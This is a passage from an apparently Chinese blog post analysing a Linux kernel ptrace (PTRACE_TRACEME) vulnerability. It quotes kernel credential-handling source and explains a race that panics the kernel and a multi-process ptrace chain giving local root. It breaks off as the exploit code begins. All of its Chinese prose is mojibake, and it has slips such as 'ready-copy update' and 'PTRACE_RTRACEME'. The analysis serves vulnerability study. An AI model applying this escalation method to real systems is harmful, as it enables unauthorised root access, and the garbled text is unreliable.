cred-&gt;user_ns) &amp;&amp; uid_eq(ns-&gt;owner, cred-&gt;euid))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If you have a capability in a parent user ns, then you have</span></span><br><span class="line"><span class="comment"> * it over all children user namespaces as well.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ns = ns-&gt;parent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We never get here */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šæ£€æŸ¥ ptracee çš„å‘½åç©ºé—´æ‰€æœ‰è€…æ˜¯å¦ä¸ ptracer ä¸ºåŒä¸€ç”¨æˆ·ï¼Œ<strong>åªæœ‰è¿™ä¸¤è€…åŒå±åŒä¸€ç”¨æˆ·ï¼Œæ£€æŸ¥æ‰èƒ½é€šè¿‡ï¼Œå¦åˆ™æ£€æŸ¥å°†ä¸ä¼šé€šè¿‡ï¼Œä»è€Œå¯¼è‡´é™æƒ</strong></p><p>æ¥ä¸‹æ¥çš„åˆ¤æ–­è¯­å¥ä¸­è°ƒç”¨çš„ <code>ns_capable()</code> å‡½æ•°æœ€ç»ˆä¹Ÿä¼šèµ°åˆ°è¿™ä¸ªè·¯å¾„ï¼Œè¿™é‡Œä¾¿ä¸å†èµ˜å™ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªè¡Œæ£€ç´¢é˜…è¯»å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ns_capable()</span><br><span class="line">ns_capable_common()</span><br><span class="line">        security_capable()</span><br><span class="line">            cap_capable()</span><br></pre></td></tr></table></figure><p>ç”±æ­¤æˆ‘ä»¬å¾—åˆ°ç»“è®ºï¼š<strong>è‹¥ ptracee è¿›ç¨‹æ‰§è¡Œ suid&#x2F;sgid ç¨‹åºï¼Œåˆ™æ£€æŸ¥ ptracee ä¿å­˜çš„ ptracer çš„ credï¼Œå³ ptracee çš„ task_struct çš„ ptracer_cred å­—æ®µçš„æƒé™ï¼Œè‹¥æƒé™ä¸è¶³åˆ™ ptracee ä»¥å…¶è‡ªèº«çš„ euid&#x2F;egid æ‰§è¡Œç¨‹åºï¼Œè€Œéæ–‡ä»¶çš„ suid&#x2F;sgid</strong></p><h2 id="LSM-ä¸-ptracer-æƒé™æ£€æŸ¥"><a href="#LSM-ä¸-ptracer-æƒé™æ£€æŸ¥" class="headerlink" title="LSM ä¸ ptracer æƒé™æ£€æŸ¥"></a>LSM ä¸ ptracer æƒé™æ£€æŸ¥</h2><p>å‰é¢æˆ‘ä»¬è®²äº†å¯¹ ptracee æ‰§è¡Œæ–°ç¨‹åºçš„æƒé™æ£€æŸ¥ï¼Œç°åœ¨æˆ‘ä»¬æ¥çœ‹å¯¹äº ptracer æ“ä½œçš„æ£€æŸ¥</p><p>å°†ç›®å…‰æ”¾å› ptrace ç³»ç»Ÿè°ƒç”¨çš„æºç ä¸­ï¼Œå¯¹äº ptracer çš„ <code>PTRACE_PEEKTEXT / PTRACE_PEEKDATA / PTRACE_POKETEXT / PTRACE_POKEDATA</code> è¿™å‡ ä¸ªæ“ä½œï¼Œä¼šèµ°å…¥å¦‚ä¸‹è·¯å¾„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SYS_ptrace()</span><br><span class="line">    arch_ptrace()</span><br><span class="line">    ptrace_request()</span><br><span class="line">    generic_ptrace_peekdata() / generic_ptrace_pokedata()</span><br><span class="line">    ptrace_access_vm()</span><br><span class="line">    ptracer_capable()</span><br><span class="line">    security_capable_noaudit()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±åˆèµ°å›æˆ‘ä»¬ä¸Šé¢çš„è·¯å¾„äº†ï¼Œä¸å†é‡å¤åˆ†æï¼Œè¿™é‡Œç®€å•è¯´æ˜ä¸€ç‚¹å°±æ˜¯åœ¨ <code>ptrace_request()</code> ä¸­ä¼ ç»™ä¸‹å±‚è¢«è°ƒå‡½æ•°çš„ task å‚æ•°ä¸º ptracee çš„ task_structï¼Œåœ¨ <code>ptrace_access_vm()</code> ä¸­ä¼ å…¥çš„å‘½åç©ºé—´ä¹Ÿä¸º ptracee çš„ mm çš„å‘½åç©ºé—´ï¼Œå› æ­¤<strong>æœ€åæƒé™åˆ¤æ–­è¿˜æ˜¯æ ¹æ® ptracee è¿›ç¨‹çš„</strong> <code>ptracer_cred</code> <strong>å­—æ®µ</strong></p><h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01.æ¼æ´åˆ†æ"></a>0x01.æ¼æ´åˆ†æ</h1><p>ç»†å¿ƒçš„è¯»è€…æˆ–è®¸å·²ç»è§‚å¯Ÿåˆ°äº†ï¼Œå‰é¢æˆ‘ä»¬çš„é¢„å¤‡çŸ¥è¯†ä¸­ç¼ºå°‘äº†<strong>è®¾ç½® ptracee çš„ ptracer_cred å­—æ®µ</strong>è¿™ä¸€è¿‡ç¨‹ï¼Œå®é™…ä¸Š<strong>æˆ‘ä»¬çš„æ¼æ´ä¾¿æ˜¯å‡ºç°åœ¨è¿™ä¸ªä½ç½®</strong></p><p>æˆ‘ä»¬å°†ç›®å…‰é‡æ–°æ”¾å› ptrace ç³»ç»Ÿè°ƒç”¨çš„æºç å½“ä¸­ï¼Œå½“ ptracee è¿›ç¨‹è°ƒç”¨ <code>ptrace(PTRACE_TRACEME, 0, NULL, NULL);</code> æ—¶ï¼Œä¼šèµ°åˆ°å¦‚ä¸‹è·¯å¾„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_ptrace()</span><br><span class="line">    ptrace_traceme()</span><br><span class="line">    __ptrace_link()</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>__ptrace_link()</code> å‡½æ•°<strong>å°±æ˜¯æœ¬æ¬¡å‡ºç°æ¼æ´çš„å‡½æ•°</strong>ï¼Œè¯¥å‡½æ•°ç”¨äºå»ºç«‹ ptrace linkï¼Œå®šä¹‰äº <code>/kernel/ptrace.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ptrace a task: make the debugger its new parent and</span></span><br><span class="line"><span class="comment"> * move it to the ptrace list.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Must be called with the tasklist lock write-held.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __ptrace_link(<span class="keyword">struct</span> task_struct *child, <span class="keyword">struct</span> task_struct *new_parent)</span><br><span class="line">&#123;</span><br><span class="line">BUG_ON(!list_empty(&amp;child-&gt;ptrace_entry));</span><br><span class="line">list_add(&amp;child-&gt;ptrace_entry, &amp;new_parent-&gt;ptraced);</span><br><span class="line">child-&gt;parent = new_parent;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">child-&gt;ptracer_cred = get_cred(__task_cred(new_parent));</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°çš„åŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯åœ¨ rcu æœºåˆ¶ä¸‹å°†å­è¿›ç¨‹çš„ <code>ptracer_cred</code> å­—æ®µè®¾ä¸º<strong>çˆ¶è¿›ç¨‹çš„ cred</strong>ï¼Œè¿™é‡Œçš„ <code>__task_cred()</code> å®çš„ä½œç”¨ä¸»è¦æ˜¯ rcu æœºåˆ¶ä¸‹å–å¾—è¿›ç¨‹ real_credï¼Œè€Œ <code>get_cred()</code> å‡½æ•°ä¸»è¦æ˜¯å°† cred çš„å¼•ç”¨è®¡æ•° + 1</p><blockquote><p>RCU æœºåˆ¶å³ ready-copy update ï¼Œè¯¥æœºåˆ¶ç¡®ä¿äº†å¤šçº¿ç¨‹ä¸‹è¯»ä¸å†™çš„åŒæ­¥ï¼Œè¿™é‡Œä¸è¯¦ç»†ä»‹ç»ï¼ŒåŸç†å¯ä»¥ç®€å•ç†è§£ä¸ºâ€œèŠ‚ç‚¹æ›´æ–°â€â€”â€”è¯»æ— é™åˆ¶ï¼Œè¦å†™æ—¶å…ˆæ–°å»ºèŠ‚ç‚¹å†™å…¥æ–°èŠ‚ç‚¹ï¼Œéšåå°†èŠ‚ç‚¹æ›´æ–°åˆ°æŒ‡é’ˆï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­è¯»è€…è¯»çš„éƒ½æ˜¯æ—§èŠ‚ç‚¹ï¼Œéšåç­‰å¾…è¯»è€…é€€å‡ºï¼Œé‡Šæ”¾æ—§èŠ‚ç‚¹ï¼Œæ–°èŠ‚ç‚¹æŠ•å…¥ä½¿ç”¨</p></blockquote><p>æŒ‰ç…§  Jann Horn çš„ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6994eefb0053799d2e07cd140df6c2ea106c41ee">issue</a> é˜è¿°ï¼Œåœ¨è¿™é‡Œå­˜åœ¨ç€<strong>ä¸¤ä¸ªé—®é¢˜</strong>ï¼š</p><ul><li>ç«æ€æ¡ä»¶ä¸‹å¯¼è‡´é”™è¯¯çš„å¼•ç”¨è®¡æ•°</li><li>ptracer_cred è®¾ç½®çš„é€»è¾‘é”™è¯¯å¯¼è‡´æœ¬åœ°ææƒ</li></ul><p>ä¸‹é¢æˆ‘ä»¬æ¥é€ä¸€åˆ†æ</p><h2 id="ç«æ€æ¡ä»¶ä¸‹å¯¼è‡´é”™è¯¯çš„å¼•ç”¨è®¡æ•°"><a href="#ç«æ€æ¡ä»¶ä¸‹å¯¼è‡´é”™è¯¯çš„å¼•ç”¨è®¡æ•°" class="headerlink" title="ç«æ€æ¡ä»¶ä¸‹å¯¼è‡´é”™è¯¯çš„å¼•ç”¨è®¡æ•°"></a>ç«æ€æ¡ä»¶ä¸‹å¯¼è‡´é”™è¯¯çš„å¼•ç”¨è®¡æ•°</h2><p>åœ¨ <code>__ptrace_link()</code> å‡½æ•°ä¸­è°ƒç”¨äº† <code>get_cred()</code> å‡½æ•°è·å–çˆ¶è¿›ç¨‹çš„ credï¼Œè¯¥å‡½æ•°ä¼šå°†å…¶å¼•ç”¨è®¡æ•° + 1ï¼Œè¿™çœ‹èµ·æ¥<strong>å¥½åƒæ²¡æœ‰ä»€ä¹ˆé—®é¢˜</strong>ï¼Œä¸æ˜¯ä¹ˆï¼Ÿæˆ‘ä»¬å¼•ç”¨äº†çˆ¶è¿›ç¨‹çš„ credï¼Œè‡ªç„¶å¼•ç”¨è®¡æ•°è¦ + 1ï¼Œå½“ ptrace æµç¨‹ç»“æŸåï¼Œå¼•ç”¨è®¡æ•°å† - 1ï¼Œè¿™ä¸€åˆ‡çœ‹èµ·æ¥ä¼¼ä¹å¾ˆæ­£å¸¸</p><p>å’‹ä¸€çœ‹è¿™ä¸ªæµç¨‹è®¾è®¡ä¼¼ä¹æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†åœ¨ç«æ€æ¡ä»¶ä¸‹å°±ä¸ä¸€å®šäº†ï¼Œæˆ‘ä»¬ç°åœ¨å°†ç›®å…‰æ”¾åˆ°ä¸€ä¸ªå¯¹äº kernel pwner è€Œè¨€æˆ–è®¸éƒ½å¾ˆç†Ÿæ‚‰ä½†ä¸ä¸€å®šæ›¾æ·±å…¥ç ”ç©¶è¿‡çš„ä¸€ä¸ªå‡½æ•°â€”â€”<code>commit_creds</code>ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>kernel/cred.c</code> ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *new)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* release the old obj and subj refs both */</span></span><br><span class="line">put_cred(old);</span><br><span class="line">put_cred(old);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¯¥å‡½æ•°æœ«å°¾ä¼šä¸¤æ¬¡è°ƒç”¨ <code>put_cred()</code> å‡½æ•°ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>/include/linux/cred.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">put_cred</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *_cred)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span> =</span> (<span class="keyword">struct</span> cred *) _cred;</span><br><span class="line"></span><br><span class="line">validate_creds(cred);</span><br><span class="line"><span class="keyword">if</span> (atomic_dec_and_test(&amp;(cred)-&gt;usage))</span><br><span class="line">__put_cred(cred);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å…¶åŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œä¸€æ˜¯è°ƒç”¨ <code>validate_cred()</code> éªŒè¯ cred æ˜¯å¦åˆæ³•ï¼Œéšåä½¿ç”¨ <code>atomic_dec_and_test</code> å®å°† cred çš„å¼•ç”¨è®¡æ•°å‡ä¸€ï¼Œå¹¶ç¡®è®¤å…¶å¼•ç”¨è®¡æ•°æ˜¯å¦ä¸º 0ï¼Œè‹¥ä¸º 0 åˆ™è°ƒç”¨ <code>__put_cred()</code></p><p>é€šå¸¸æ¥è¯´ï¼Œåœ¨ commit_creds ä¸¤æ¬¡å‡å»å¼•ç”¨è®¡æ•°ï¼ˆcred ä¸€æ¬¡ï¼Œreal_cred ä¸€æ¬¡ï¼‰åæœ€ç»ˆæ‰§è¡Œæµéƒ½ä¼šèµ°åˆ° <code>__put_cred()</code>ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>/kernel/cred.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * __put_cred - Destroy a set of credentials</span></span><br><span class="line"><span class="comment"> * @cred: The record to release</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Destroy a set of credentials on which no references remain.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __put_cred(<span class="keyword">struct</span> cred *cred)</span><br><span class="line">&#123;</span><br><span class="line">kdebug(<span class="string">&quot;__put_cred(%p&#123;%d,%d&#125;)&quot;</span>, cred,</span><br><span class="line">       <span class="type">atomic_read</span>(&amp;cred-&gt;usage),</span><br><span class="line">       read_cred_subscribers(cred));</span><br><span class="line"></span><br><span class="line">BUG_ON(<span class="type">atomic_read</span>(&amp;cred-&gt;usage) != <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">BUG_ON(read_cred_subscribers(cred) != <span class="number">0</span>);</span><br><span class="line">cred-&gt;magic = CRED_MAGIC_DEAD;</span><br><span class="line">cred-&gt;put_addr = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">BUG_ON(cred == current-&gt;cred);</span><br><span class="line">BUG_ON(cred == current-&gt;real_cred);</span><br><span class="line"></span><br><span class="line">call_rcu(&amp;cred-&gt;rcu, put_cred_rcu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°å…¶ä¸€å¼€å§‹å…ˆéªŒè¯ cred çš„å¼•ç”¨è®¡æ•°ï¼Œéšåè°ƒç”¨ <code>call_rcu()</code>ï¼Œè¯¥å‡½æ•°çš„ä½œç”¨å¯ä»¥ç®€å•ç†è§£ä¸ºåœ¨ rcu æœºåˆ¶ä¸‹è°ƒç”¨å‡½æ•°æŒ‡é’ˆï¼Œè¿™é‡Œè°ƒç”¨çš„æ˜¯ <code>put_cred_rcu()</code> å‡½æ•°ï¼Œå®šä¹‰äº <code>/kernel/cred.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The RCU callback to actually dispose of a set of credentials</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">put_cred_rcu</span><span class="params">(<span class="keyword">struct</span> rcu_head *rcu)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span> =</span> container_of(rcu, <span class="keyword">struct</span> cred, rcu);</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">&quot;put_cred_rcu(%p)&quot;</span>, cred);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="keyword">if</span> (cred-&gt;magic != CRED_MAGIC_DEAD ||</span><br><span class="line">    <span class="type">atomic_read</span>(&amp;cred-&gt;usage) != <span class="number">0</span> ||</span><br><span class="line">    read_cred_subscribers(cred) != <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;CRED: put_cred_rcu() sees %p with&quot;</span></span><br><span class="line">      <span class="string">&quot; mag %x, put %p, usage %d, subscr %d\n&quot;</span>,</span><br><span class="line">      cred, cred-&gt;magic, cred-&gt;put_addr,</span><br><span class="line">      <span class="type">atomic_read</span>(&amp;cred-&gt;usage),</span><br><span class="line">      read_cred_subscribers(cred));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">if</span> (<span class="type">atomic_read</span>(&amp;cred-&gt;usage) != <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;CRED: put_cred_rcu() sees %p with usage %d\n&quot;</span>,</span><br><span class="line">      cred, <span class="type">atomic_read</span>(&amp;cred-&gt;usage));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">security_cred_free(cred);</span><br><span class="line">key_put(cred-&gt;session_keyring);</span><br><span class="line">key_put(cred-&gt;process_keyring);</span><br><span class="line">key_put(cred-&gt;thread_keyring);</span><br><span class="line">key_put(cred-&gt;request_key_auth);</span><br><span class="line"><span class="keyword">if</span> (cred-&gt;group_info)</span><br><span class="line">put_group_info(cred-&gt;group_info);</span><br><span class="line">free_uid(cred-&gt;user);</span><br><span class="line">put_user_ns(cred-&gt;user_ns);</span><br><span class="line">kmem_cache_free(cred_jar, cred);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯è§å…¶ä¼šåˆ¤æ–­ cred çš„å¼•ç”¨è®¡æ•°æ˜¯å¦ä¸º 0ï¼Œ<strong>è‹¥ä¸ä¸º 0 åˆ™ä¼šå¯¼è‡´ kernel panic</strong>ï¼Œåœ¨æ­£å¸¸æƒ…å†µä¸‹åˆ™æ˜¯å¸¸è§„çš„å°† cred é‡Šæ”¾å› cred_jar è¿™ä¸€ slub çš„æµç¨‹</p><p>çœ‹èµ·æ¥å¥½åƒæ²¡ä»€ä¹ˆé—®é¢˜ï¼Œåœ¨è¿›å…¥é‡Šæ”¾å‡½æ•°å‰å·²æœ‰ä¸€æ¬¡æ£€æŸ¥ï¼Œæƒ³å¿…æ²¡æœ‰å¯èƒ½å¼•èµ· kernel panicï¼Œ<strong>å®åˆ™ä¸ç„¶</strong>ï¼Œæˆ‘ä»¬è€ƒè™‘å¦‚ä¸‹ç«æ€åœºæ™¯ï¼š</p><ul><li>çˆ¶è¿›ç¨‹ä¸æ–­åœ°æ›´æ–°è‡ªèº« cred</li><li>å­è¿›ç¨‹ä¸æ–­åœ°è°ƒç”¨ <code>ptrace(PTRACE_TRACEME, 0, NULL, NULL)</code></li></ul><p>åœ¨è¿™ç§åœºæ™¯ä¸‹ï¼Œè‹¥æ˜¯çˆ¶è¿›ç¨‹åœ¨æ›´æ–°è‡ªèº« cred æ—¶ï¼Œåœ¨çˆ¶è¿›ç¨‹æ›¿æ¢è‡ªèº« cred ä¹‹å‰å­è¿›ç¨‹è·å–åˆ°äº†çˆ¶è¿›ç¨‹çš„æ—§ credï¼Œåœ¨çˆ¶è¿›ç¨‹è¿›å…¥åˆ° <code>put_cred_rcu</code> å‡½æ•°ä¹‹åå­è¿›ç¨‹åˆšå¥½æ‰å°†æ—§ cred çš„å¼•ç”¨è®¡æ•° +1ï¼Œæ­¤æ—¶ä¾¿<strong>æ— æ³•é€šè¿‡é‡Šæ”¾å‡½æ•°ä¸­çš„å¼•ç”¨è®¡æ•°æ£€æŸ¥ï¼Œä»è€Œé€ æˆ kernel panic</strong></p><h2 id="ptracer-cred-è®¾ç½®çš„é€»è¾‘é”™è¯¯å¯¼è‡´æœ¬åœ°ææƒ"><a href="#ptracer-cred-è®¾ç½®çš„é€»è¾‘é”™è¯¯å¯¼è‡´æœ¬åœ°ææƒ" class="headerlink" title="ptracer_cred è®¾ç½®çš„é€»è¾‘é”™è¯¯å¯¼è‡´æœ¬åœ°ææƒ"></a>ptracer_cred è®¾ç½®çš„é€»è¾‘é”™è¯¯å¯¼è‡´æœ¬åœ°ææƒ</h2><p>è¿™ä¸ªé€»è¾‘æ¼æ´çš„åˆ©ç”¨åœ¨ç¬”è€…çœ‹æ¥<strong>ååˆ†å·§å¦™</strong>ï¼Œåœ¨æ­£å¸¸æƒ…å†µä¸‹æ™®é€šæƒé™çš„ ptracer ç¡®ä¹æ˜¯æ— æ³•è°ƒè¯•æ‰§è¡Œ suid ç¨‹åºçš„ pracee çš„ï¼Œä½†æ˜¯ Jann Horn æå‡ºäº†ä¸€ä¸ªååˆ†å·§å¦™çš„<strong>å¤šçº§ ptrace æ–¹æ¡ˆ</strong></p><p>æˆ‘ä»¬ç°åœ¨æ¥è€ƒè™‘å¦‚ä¸‹åœºæ™¯ï¼š</p><ul><li>è¿›ç¨‹ A fork å‡ºå­è¿›ç¨‹ B</li><li>è¿›ç¨‹ B fork å‡ºå­è¿›ç¨‹ C</li><li>è¿›ç¨‹ B æ‰§è¡Œä¸€ä¸ª<strong>å…ˆææƒåé™æƒçš„</strong> suid ç¨‹åº</li><li>è¿›ç¨‹ C æ£€æµ‹åˆ°è¿›ç¨‹ B ææƒåå‘èµ· <code>PTRACE_RTRACEME</code> è¯·æ±‚ï¼Œéšåæ‰§è¡Œä¸€ä¸ª suid ç¨‹åºï¼Œæ­¤æ—¶å› ä¸ºè¿›ç¨‹ B å·²ç»ææƒæ‰€ä»¥ ptrace link å»ºç«‹æˆåŠŸï¼Œ<strong>æ­¤æ—¶è¿›ç¨‹ C ä¸º root æƒé™</strong></li><li>è¿›ç¨‹ A æ£€æµ‹åˆ°è¿›ç¨‹ B æ‰§è¡Œ suid ç¨‹åºåï¼Œä¸»åŠ¨ ptrace attach è¿›ç¨‹ B</li><li>æ­¤æ—¶<strong>è¿›ç¨‹ B å·²ç»å®Œæˆé™æƒï¼Œæ•…è¿›ç¨‹ A å¯ä»¥ ptrace è¿›ç¨‹ Bï¼Œè€Œè¿›ç¨‹ B å·²ç»ä¸è¿›ç¨‹ C å»ºç«‹äº† ptrace linkï¼Œæ­¤æ—¶è¿›ç¨‹ C åœ¨åˆ¤æ–­è¿›ç¨‹ B æƒé™æ—¶ä½¿ç”¨çš„æ˜¯æ­¤å‰ä¿å­˜çš„ root credï¼Œæ•…è¿›ç¨‹ B å¯ä»¥ ptrace è¿›ç¨‹ C è®©å…¶åœ¨ root æƒé™ä¸‹æ‰§è¡Œæ¶æ„ä»£ç </strong></li></ul><p>å¬èµ·æ¥ä¼¼ä¹éœ€è¦ä¸€äº›æ¡ä»¶ç«äº‰ï¼Ÿè€Œä¸”æˆ‘ä»¬ä¼¼ä¹å¾ˆéš¾æ‰¾åˆ°è¿™æ ·ä¸€ä¸ª suid ç¨‹åºï¼Œ<strong>è¿™ä»¤è¿™ä¸ªæ¼æ´å˜å¾—ååˆ†çš„é¸¡è‚‹</strong>ï¼Œæˆ‘ä»¬åªèƒ½åœ¨ä¸€äº›ç‰¹å®šå‘è¡Œç‰ˆä¸‹å®Œæˆåˆ©ç”¨</p><h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02.æ¼æ´åˆ©ç”¨"></a>0x02.æ¼æ´åˆ©ç”¨</h1><h2 id="åˆ©ç”¨ç«æ€æ¡ä»¶é€ æˆ-kernel-panic"><a href="#åˆ©ç”¨ç«æ€æ¡ä»¶é€ æˆ-kernel-panic" class="headerlink" title="åˆ©ç”¨ç«æ€æ¡ä»¶é€ æˆ kernel panic"></a>åˆ©ç”¨ç«æ€æ¡ä»¶é€ æˆ kernel panic</h2><p>å‰é¢æˆ‘ä»¬å·²ç»è®²åˆ°å¼€ä¸¤ä¸ªè¿›ç¨‹è¿›è¡Œç«äº‰ä¾¿èƒ½è§¦å‘ kernel panicï¼Œè€Œåˆæ³•æ›´æ–°çˆ¶è¿›ç¨‹çš„ cred çš„æ–¹å¼æœ‰å¾ˆå¤šï¼Œä¾‹å¦‚ <code>setresuid</code> è¿™ä¸€ç³»åˆ—çš„ç³»ç»Ÿè°ƒç”¨ä¾¿èƒ½åˆæ³•æ›´æ–°è¿›ç¨‹çš„ credï¼Œè¿™é‡Œæˆ‘ä»¬ä¾¿é€‰ç”¨ setresuid ç³»ç»Ÿè°ƒç”¨</p><p>exp å¦‚ä¸‹ï¼Œè¿™é‡Œå‚è€ƒäº† jannh ç»™å‡ºçš„ pocï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 